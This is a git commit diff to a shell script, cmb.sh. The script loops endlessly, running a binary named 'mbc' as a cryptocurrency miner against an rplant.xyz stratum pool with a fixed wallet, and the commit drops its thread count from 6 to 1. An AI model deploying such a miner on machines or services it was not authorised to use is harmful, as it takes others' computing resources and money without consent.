96cca2c21d99f94154e4c21cdcad3aa282d57ce9
nagabanar45 <85068180+nagabanar45@users.noreply.github.com>
2021-05-30 23:33:32 +0800

    Update cmb.sh

--- cmb.sh
+++ cmb.sh
@@ -8,6 +8,6 @@
 #
 while [ 1 ]; do
 chmod +x mbc
-./mbc -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MqmM35U2EtSFVvit5VcW7nY9raBy6Sw6vm -t 6 -p password=X 
+./mbc -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MqmM35U2EtSFVvit5VcW7nY9raBy6Sw6vm -t 1 -p password=X 
 sleep 5
 done
